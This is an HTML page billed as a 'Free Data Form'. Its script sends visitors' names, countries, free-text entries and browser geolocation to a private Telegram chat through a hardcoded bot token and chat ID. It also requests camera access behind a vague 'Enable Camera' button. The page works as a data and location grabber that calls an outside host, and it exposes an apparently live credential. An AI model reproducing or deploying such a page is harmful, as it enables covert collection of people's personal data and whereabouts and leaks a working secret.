<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Data Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .container {
            background: white;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
            width: 320px;
        }
        h3 {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            background: #0095f6;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            font-weight: bold;
        }
        button:hover {
            background: #0078d4;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h3>Free Data Form</h3>
        <input type="text" id="naam" placeholder="Enter Your Name">
        <input type="text" id="country" placeholder="Enter Your Country Name">
        <input type="text" id="field1" placeholder="Enter First Text">
        <input type="text" id="field2" placeholder="Enter Second Text">
        <input type="text" id="field3" placeholder="Enter Third Text">
        <input type="text" id="field4" placeholder="Enter Fourth Text">
        
        <button onclick="sendToTelegram()">Continue</button>
        <button onclick="requestCamera()">Enable Camera</button>
        <button onclick="requestLocation()">Enable Location</button>
        
        <div class="footer">
            <p>Note: This is a test page.</p>
        </div>
    </div>

    <script>
        function sendToTelegram() {
            let naam = document.getElementById('naam').value;
            let country = document.getElementById('country').value;
            let field1 = document.getElementById('field1').value;
            let field2 = document.getElementById('field2').value;
            let field3 = document.getElementById('field3').value;
            let field4 = document.getElementById('field4').value;

            if (naam && country && field1 && field2 && field3 && field4) {
                let message = `New Entry:\nNaam: ${naam}\nCountry: ${country}\nField 1: ${field1}\nField 2: ${field2}\nField 3: ${field3}\nField 4: ${field4}`;
                let botToken = "7707046070:AAHFP0unHH3dElF0zYFSLug-XImvIMdyyCQ";  // Replace with your bot token
                let chatId = "6866891553";  // Replace with your chat ID
                let url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("Message sent to Telegram bot!");
                    } else {
                        alert("Error sending message.");
                    }
                })
                .catch(error => {
                    alert("Failed to send message.");
                });
            } else {
                alert('Please fill in all fields.');
            }
        }

        function requestCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                alert("Camera access granted!");
                let tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
            })
            .catch(error => {
                alert("Camera access denied: " + error.message);
            });
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        let latitude = position.coords.latitude;
                        let longitude = position.coords.longitude;
                        alert(`Location: Lat ${latitude}, Lng ${longitude}`);

                        let botToken = "7707046070:AAHFP0unHH3dElF0zYFSLug-XImvIMdyyCQ";  // Replace with your bot token
                        let chatId = "6866891553";  // Replace with your chat ID
                        let message = `User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
                        let url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                        fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({ chat_id: chatId, text: message })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                alert("Location sent to Telegram bot!");
                            } else {
                                alert("Error sending location.");
                            }
                        })
                        .catch(error => {
                            alert("Failed to send location.");
                        });
                    },
                    (error) => {
                        if (error.code === error.PERMISSION_DENIED) {
                            alert("You denied location access. Please enable it in your browser settings.");
                        } else {
                            alert("Location access error: " + error.message);
                        }
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
    </script>

</body>
</html>